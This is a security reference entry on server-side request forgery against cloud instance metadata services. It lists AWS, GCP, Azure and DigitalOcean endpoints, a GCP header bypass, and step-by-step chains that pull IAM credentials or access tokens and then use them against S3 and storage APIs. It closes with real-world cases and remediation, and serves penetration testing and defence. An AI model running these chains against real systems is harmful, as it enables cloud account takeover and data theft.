# Cloud Metadata SSRF â€” Credential Extraction

**Category:** SSRF  
**Severity:** Critical  
**CWE:** CWE-918  
**Last Updated:** 2026-02-03  
**Author:** Ghost ðŸ‘»

---

## Attack Pattern

Cloud providers expose instance metadata services at link-local addresses. When an application is vulnerable to SSRF, attackers can query these endpoints to extract IAM credentials, SSH keys, user-data scripts (often containing secrets), and infrastructure details.

This is the **highest-impact** SSRF variant because it directly leads to cloud account compromise.

---

## Cloud Metadata Endpoints

### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
```

### AWS (IMDSv2) â€” Requires token
```bash
# Step 1: Get token (requires PUT â€” harder to exploit via SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```
**Note:** IMDSv2 mitigates basic SSRF but not all (gopher:// can send PUT).

### Google Cloud Platform (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```
**Note:** v1 requires header `Metadata-Flavor: Google`, but v1beta1 does NOT (deprecated but often still active).

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Requires header: `Metadata: true`

### DigitalOcean
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

### Kubernetes (if running in-cluster)
```
https://kubernetes.default.svc/api/v1/namespaces
# Token at: /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Detection Method

### Indicators of Cloud-Hosted Target
- Response headers revealing `X-Amzn-*`, `X-Goog-*`, or `X-Azure-*`
- DNS pointing to AWS/GCP/Azure IP ranges
- `.amazonaws.com`, `.compute.googleapis.com`, `.cloudapp.azure.com` in DNS
- Error messages leaking cloud provider details

### Testing
1. Inject `http://169.254.169.254/latest/meta-data/` via any SSRF vector
2. If response includes `ami-id`, `instance-id`, etc. â†’ AWS confirmed
3. Try credential endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Response lists IAM role name â†’ fetch credentials at that role path
5. Use extracted `AccessKeyId`, `SecretAccessKey`, `Token` with AWS CLI

---

## Exploitation Steps

### AWS Full Chain
```
# 1. Discover IAM role
SSRF â†’ http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response: "WebAppRole"

# 2. Extract credentials
SSRF â†’ http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole
Response: {
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-02-03T15:00:00Z"
}

# 3. Use credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls  # List S3 buckets
aws iam get-user  # Check permissions
```

### GCP Chain (v1beta1 bypass)
```
# No Metadata-Flavor header required on v1beta1
SSRF â†’ http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
Response: {"access_token":"ya29.c...","expires_in":3600,"token_type":"Bearer"}

# Use token
curl -H "Authorization: Bearer ya29.c..." https://storage.googleapis.com/storage/v1/b
```

---

## Real-World Examples

### Radio Streaming SSRF â†’ GCP Server Takeover (2024)
- **Target:** Web app with radio streaming feature
- **Vector:** `source_file` parameter for MP3 URL
- **Payload:** `http://169.254.169.254/computeMetadata/v1`
- **Result:** Retrieved SSH credentials in plaintext from user_data, gained root access
- **Source:** Malvin Valerian bug bounty writeup (Medium, Aug 2024)

### Capital One Breach (2019)
- **Vector:** SSRF in WAF configuration
- **Impact:** Extracted AWS IAM credentials via metadata endpoint
- **Result:** 100M+ customer records stolen, $80M fine
- **Lesson:** Even major financial institutions fall to SSRF â†’ metadata chains

### HackerOne Report #508459 (honoki)
- **Target:** AWS-hosted application
- **Vector:** SSRF to metadata service
- **Impact:** Full IAM credential extraction

### Dropbox SSRF ($4,913 bounty)
- **Demonstrated metadata access capability**
- **One of highest SSRF-only payouts at the time**

---

## Remediation

1. **Enforce IMDSv2 (AWS)**: Require token-based metadata access â€” blocks simple GET-based SSRF
2. **Use GCP Metadata v1 only**: Disable v1beta1, require `Metadata-Flavor: Google` header
3. **Azure**: Require `Metadata: true` header
4. **Network policies**: Block outbound to 169.254.169.254 from application containers
5. **Firewall rules**: iptables rule blocking link-local from web-facing processes
6. **Least-privilege IAM**: Even if credentials leak, minimize what they can do

---

## Web3 Relevance

Web3 backends are almost always cloud-hosted (AWS, GCP). SSRF â†’ metadata is devastating because:
- **Signing keys** may be stored in cloud KMS accessible via IAM role
- **RPC node credentials** for premium endpoints (Infura, Alchemy) in env vars/metadata
- **Database credentials** for off-chain data stores
- **Wallet hot-key access** if stored in cloud HSM/secrets manager
- Bridge validators on EC2 â†’ IAM role compromise â†’ validator key access â†’ fund drainage
